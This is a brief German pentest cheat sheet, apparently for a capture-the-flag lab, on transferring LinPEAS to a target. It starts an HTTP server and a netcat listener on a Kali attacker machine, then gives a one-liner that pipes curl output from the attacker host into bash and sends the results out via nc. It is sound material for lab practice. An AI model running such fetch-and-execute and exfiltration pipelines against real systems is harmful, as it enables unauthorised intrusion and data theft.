# LinPEAS Transfer
## Freigabe auf dem Attacker System
```bash
──(fuchs㉿kali)-[~]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

## Ausgabedatei Empfangen
```bash
┌──(fuchs㉿kali)-[~]
└─$ nc -lvnp 7891 > linPEAS.out
listening on [any] 7891 ...
```

## Hochladen und ausführen von linPEAS
```bash
$ curl 10.10.14.4:8000/linpeas.sh | bash | nc 10.10.14.4 7891
```
